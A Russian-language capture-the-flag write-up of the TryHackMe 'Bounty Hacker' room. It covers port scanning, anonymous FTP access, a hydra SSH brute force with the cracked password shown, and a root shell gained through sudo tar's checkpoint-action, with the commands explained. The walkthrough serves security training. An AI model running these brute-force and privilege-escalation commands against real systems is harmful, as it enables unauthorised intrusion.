<div align="center">

# Bounty Hacker

[![Difficulty](https://img.shields.io/badge/Difficulty-Easy-000000?style=for-the-badge&logoColor=ff0000)](https://tryhackme.com/room/cowboyhacker)[![Category](https://img.shields.io/badge/FTP-000000?style=for-the-badge&logoColor=ff0000)](https://tryhackme.com/room/cowboyhacker)[![Category](https://img.shields.io/badge/Bruteforce-000000?style=for-the-badge&logoColor=ff0000)](https://tryhackme.com/room/cowboyhacker)[![Category](https://img.shields.io/badge/Privesc-000000?style=for-the-badge&logoColor=ff0000)](https://tryhackme.com/room/cowboyhacker)

</div> <br/>

## `./recon`

Проведено сканирование портов через nmap

```bash
nmap -sS <ip> -sV

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
80/tcp open  http    Apache httpd 2.4.41 (Ubuntu)
```

Открыты ftp, ssh и http. Начнём с 80 порта

<br/>

## `./enum`

Просмотрена главная страница

```bash
curl <ip>
```

Страница в стиле Cowboy Bebop, ничего технически полезного в самом тексте

Запущен gobuster для поиска директорий и файлов

```bash
gobuster dir -u http://<ip> -w /usr/share/wordlists/dirb/common.txt -x http,txt,php

/images               (Status: 301) [--> /images/]
/index.html           (Status: 200)
/javascript           (Status: 301) [--> /javascript/]
```

`/javascript` закрыт (403 Forbidden). В `/images` включён листинг директории — найден файл `crew.jpg`, ничего интересного для дальнейшего продвижения

<br/>

## `./ftp`

Порт 80 не дал зацепок, вернулся к ftp. Попробован анонимный вход

```bash
ftp <ip>

Name (<ip>:root): anonymous
230 Login successful.
```

В корне найдены два файла

```bash
ls

locks.txt
task.txt
```

Оба скачаны

```bash
mget locks.txt task.txt
```

<br/>

## `./credentials`

Содержимое `task.txt`

```
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

Подпись `-lin` — вероятное имя пользователя

Содержимое `locks.txt` — список из нескольких десятков строк, похожих на пароли (варианты написания "Red Dragon Syndicate" с заменой букв на цифры и спецсимволы)

Собраны оба файла в пару логин/список паролей для перебора

<br/>

## `./bruteforce`

Запущен hydra по ssh с логином `lin` и списком паролей из `locks.txt`

```bash
hydra -l lin -P locks.txt ssh://<ip>

[22][ssh] host: <ip>   login: lin   password: RedDr4gonSynd1cat3
```

Пароль подобран

<br/>

## `./access`

Вход по ssh с найденными учётными данными

```bash
ssh lin@<ip>
```

В домашней директории найден `user.txt`

```bash
cat user.txt
```

Первый флаг получен ✅

<br/>

## `./privesc`

Проверены права через sudo

```bash
sudo --list

User lin may run the following commands on ip-10-130-167-13:
    (root) /bin/tar
```

`lin` может запускать `/bin/tar` от root. Через [GTFOBins (tar)](https://gtfobins.org/gtfobins/tar/) найден способ получить shell

```bash
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

Разбор команды:

1. **`sudo tar cf /dev/null /dev/null`** — инициализирует создание архива. Чтобы не тратить время и ресурсы диска на реальное сжатие, в качестве файла назначения (куда писать) и источника (что сжимать) указано виртуальное пустое устройство `/dev/null`
2. **`--checkpoint=1`** — служебный флаг, приказывает утилите срабатывать (создавать контрольную точку) после каждого записанного блока данных (по умолчанию 1 блок = 10 КБ)
3. **`--checkpoint-action=exec=/bin/sh`** — указывает действие, которое должно выполниться при достижении чекпоинта — запуск командного интерпретатора `/bin/sh`

При запуске `tar` мгновенно формирует минимальные служебные метаданные архива и записывает первый блок в целевой `/dev/null`. Счётчик блоков тут же достигает значения `1`, триггер срабатывает, и `tar` выполняет `exec=/bin/sh`.

Поскольку сам процесс `tar` был запущен через `sudo`, вызванная им командная оболочка унаследовала права суперпользователя — получен root-shell

<br/>

## `./root`

Подтверждение прав

```bash
sudo -l

User root may run the following commands on ip-10-130-167-13:
    (ALL : ALL) ALL
```

Финальный флаг найден

```bash
find / -name root.txt 2>/dev/null

/root/root.txt
```

```bash
cat root.txt
```

Второй флаг получен ✅